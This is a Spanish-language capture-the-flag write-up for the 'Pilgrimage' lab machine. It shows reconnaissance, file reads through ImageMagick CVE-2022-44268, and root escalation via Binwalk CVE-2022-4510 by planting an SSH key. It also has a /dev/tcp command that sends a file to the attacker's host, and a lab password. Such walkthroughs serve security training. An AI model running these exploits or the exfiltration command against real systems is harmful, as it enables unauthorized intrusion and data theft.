# Pilgrimage

![](../../../../~gitbook/image.md)Publicado: 15 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Pilgrimage es una máquina Linux que aloja un servicio web para la subida y procesamiento de imágenes. La máquina explota dos vulnerabilidades principales: una en ImageMagick (CVE-2022-44268) que permite la exfiltración de archivos sensibles del sistema, y otra en Binwalk (CVE-2022-4510) que permite escalar privilegios a root. La ruta de ataque requiere conocimientos sobre explotación de aplicaciones de procesamiento de imágenes, análisis de código fuente y enumeración de sistemas Linux.
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Debemos agregar este dominio a nuestro archivo hosts.
###🌐 Enumeración Web

####80 HTTP
Enumerando el servicio web del puerto 80 descubrimos un servicio web que permite la subida de imágenes.![](../../../../~gitbook/image.md)Creamos una cuenta:![](../../../../~gitbook/image.md)Si intentamos subir un archivo con extensión php falla:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Tras interceptar la petición con burp, usar el Intruder para intentar bypassear los filtros de extensiones y el Content-Type no encontramos un posiblevector de entrada.🕷️Fuzzing de directoriosAl realizar fuzzing de directorios encontramos un recurso interesante llamdo /tmp:![](../../../../~gitbook/image.md)Aunque al intentar acceder nos devuelve un 403Probamos de nuevo pero esta vez usando la lista common.txt de seclists y encontramos que existe un repositorio git:![](../../../../~gitbook/image.md)Procedemos a descargarlo usando la herramienta git_dumper:Una vez descargado vemos los siguientes recursos:![](../../../../~gitbook/image.md)En el directorio .git encontramos un usuario llamado emily en el fichero `COMMIT_EDITMSG`![](../../../../~gitbook/image.md)Por otro lado, tabién vemos un binario llamado magick. Vale la pena enumera la versión ya que esta herramienta presentó vulnerabilidades en el pasado:
###💻 Explotación
🔓 CVE-2022-44268Comprobamos que tal como suponíamos la versión de Magic es vulnerable a Arbitrary File Upload:
https://www.exploit-db.com/exploits/51261![](../../../../~gitbook/image.md)Usaremos el siguiente exploit en python:https://github.com/kljunowsky/CVE-2022-44268Descargamos la herramienta y sus dependenciasUsamos la herramienta para crear la imagen "envenenada"A continuación la subimos al host.![](../../../../~gitbook/image.md)Ahora comprobamos si el exploit ha funcionado y al cargar la imagen podemos leer el contenido del fichero /etc/hosts que habíamos embebido:![](../../../../~gitbook/image.md)La prueba de concepto ha funcionado, por lo que podemos probar esto mismo con otros archivos que puedan resultar útiles.Anteriormente cuando descargamos el código fuente del sitio web vimos que había un archivo interesante en login.php:![](../../../../~gitbook/image.md)Podemos intentar leer el archivo /var/db/pilgrimagePero obtenemos el siguiente error:Eso puede tener sentido, ya que se trata de datos binarios y el script parece esperar solo texto ASCII.Descargamos el archivo de imagen manualmente de la web y a continuación mediante el uso de grep extraemos el contenido:Ahora que ya tenemos un archivo .sqlite descargado, usamos la herramienta para cargarlo y obtener la contraseña del usuario emily:
####FootHold
Iniciamos sesión vía ssh como emily y cpaturamos la primera flag.
####👑 Escalada de privilegios
Enumeramos la máquina para encontrar un vector que nos permita escalar privilegios.Tras un buen rato enumerando (SUID, permisos, grupos, capabilities, directorios, etc) lo encontramos finalmente al enumerar los servicios:![](../../../../~gitbook/image.md)Verificamos que únicamente tenemos permisos de lectura sobre este script:![](../../../../~gitbook/image.md)Podemos enviarnos el contenido de este script a nuestro host de ataque para una mejor visualización con el siguiente comando:En el host de ataque nos podemos a la escucha:En el host remoto:![](../../../../~gitbook/image.md)El script usa inotifywait para monitorear el directorio /var/www/pilgrimage.htb/shrunk/ en busca de nuevos archivos.Cuando se crea un archivo nuevo, el script usa tail y sed para extraer el nombre del archivo de la salida de inotifywait.Luego, se usa binwalk para extraer cualquier dato binario y almacenarlo en la variable binout.
Si se encuentra alguna de las cadenas en la lista negra, el archivo se elimina.
Siempre que se usen herramientas no predeterminadas en scripts ejecutados por root como estos, conviene analizarlo con más detalle. Empezamos enumerando la versión de Binwalk:![](../../../../~gitbook/image.md)🔓 CVE-2022-4510Esta versión es vulnerable. Existe un exploit para esta versión que permite la ejecución remota de comandos. En este caso voy a usar uno que realiza directory path traversal que permite copiar una clave ssh generada en el directorio /root/.ssh de la máquina comprometida:https://github.com/adhikara13/CVE-2022-4510-WalkingPathGeneramos una clave pública y privada con SSH sin contraseña:![](../../../../~gitbook/image.md)Ahora usamos el exploit indicando una imagen fake y la clave id_rsa.pub que copiaremos en el directorio /root/.ssh de la máquina comprometida.![](../../../../~gitbook/image.md)Observamos que tras la ejecución del comando, nos genera la imagen envenenada que deberemos copiar en el directorio /shrunk donde la herramienta binwalk comprueba el tipo si es un ejecutable de windows o linux.Subimos la imagen a la máquina comprometida usando scp:Una vez hemos copiado el archivo, presuponemos que el proceso que identifica que cada vez que haya un cambio se ejecute binwalk, ya habrá copiado la clave pública fake de ssh al directorio /root/.ssh y podremos conectarnos con root sin contraseña, así que verificamos:Confirmamos la escalada de privilegios a root y ya podemos obtener la flag.Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.11.219
PING 10.10.11.219 (10.10.11.219) 56(84) bytes of data.
64 bytes from 10.10.11.219: icmp_seq=1 ttl=63 time=49.7 ms
64 bytes from 10.10.11.219: icmp_seq=2 ttl=63 time=48.5 ms

--- 10.10.11.219 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1015ms
rtt min/avg/max/mdev = 48.481/49.093/49.705/0.612 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.219 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.11.219 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:13 CEST
Nmap scan report for 10.10.11.219
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds

```

```
10.10.10.75 - pilgrimage.htb
```

```
echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://pilgrimage.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings -C 404 -x php
```

```
feroxbuster -u http://pilgrimage.htb -r  -w /usr/share/seclists/Discovery/Web-Content/common.txt --scan-dir-listings -C 404
```

```
pyenv activate my_scripts_env
git_dumper http://pilgrimage.htb git-dump
```

```
~/git-dump-pilgrimage   master ❯ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

```
pyenv activate my_scripts_env
git clone https://github.com/kljunowsky/CVE-2022-44268.git
pip install -r requirements.txt
pip install Pillow
```

```
python3 CVE-2022-44268.py --image /image.png --file-to-read /etc/hosts --output poisoned.png
```

```
python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6824df504bddf.png
```

```
python CVE-2022-44268.py --image /image.png --file-to-read /var/db/pilgrimage --output pngout.png

python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6824e2258a270.png
```

```
decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x91 in position 99: invalid start byte
```

```
identify -verbose 655cdbb27cce4.png | grep -Pv "^( |Image)"  | xxd -r -p > pilgrimage.sqlite
```

```
sqlite3 pilgrimage.sqlite

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
images  users
sqlite> .schema users
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
sqlite> select * from users;
emily|abigchonkyboi123
sqlite>
```

```
ssh emily@10.10.11.219
emily|abigchonkyboi123
```

```
ps -faux | grep root
```

```
emily@pilgrimage:/var/www/pilgrimage.htb$ ls -la /usr/sbin/malwarescan.sh
-rwxr--r-- 1 root root 474 Jun  1  2023 /usr/sbin/malwarescan.sh
```

```
nc -nlvp 443 > malwarescan.sh
```

```
cat /usr/sbin/malwarescan.sh > /dev/tcp/10.10.14.14/443
```

```
git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath.git
```

```
sudo ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
```

```
python3 walkingpath.py ssh  ../image.png id_rsa.pub
```

```
scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/
```

```
ssh root@10.10.11.219
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@pilgrimage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@pilgrimage:~#
```
